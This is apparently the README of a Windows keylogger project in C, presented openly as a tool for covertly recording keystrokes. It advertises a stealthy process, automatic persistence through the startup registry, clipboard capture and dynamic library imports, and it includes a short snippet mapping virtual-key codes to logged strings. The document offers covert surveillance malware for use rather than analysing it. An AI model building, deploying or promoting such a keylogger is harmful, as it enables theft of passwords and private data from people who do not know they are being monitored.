# KeyLogger-For-Windows
Keystroke logging, often referred to as keylogging or keyboard capturing, is the action of recording the keys struck on a keyboard, typically covertly, so that a person using the keyboard is unaware that their actions are being monitored. Data can then be retrieved by the person operating the logging program.
 ## Features
- Stealthy process
- Automatically added to startup registry
- Keyboard locale support
- Special characters and numeric keypad
- Clipboard parsing on `Ctrl + V`
- Supports Windows XP, Vista, 8 and 10

## Configuration
You may configure the name of the logging file in the `config.h` file as well as what should be logged for each [virtual-key code](https://msdn.microsoft.com/en-us/library/windows/desktop/dd375731.aspx) by modifying the `keylogger.c` file.
```c
LPCWSTR get_virtual_key_value(DWORD vk_code) 
{
	switch (vk_code) {
	case VK_RETURN:
		return L"\r\n";
	case VK_ESCAPE:
		return L"[ESC]";
	case VK_BACK:
		return L"[BACKSPACE]";
	default:
		return NULL;
	}
}
```

## Build
Visual Studio 2017 is required to load the solution. However, the project may be compiled by any Windows `C11` compiler. The only required Windows library is `Kernel32.lib`. All other library functions are dynamically imported with `LoadLibrary`.
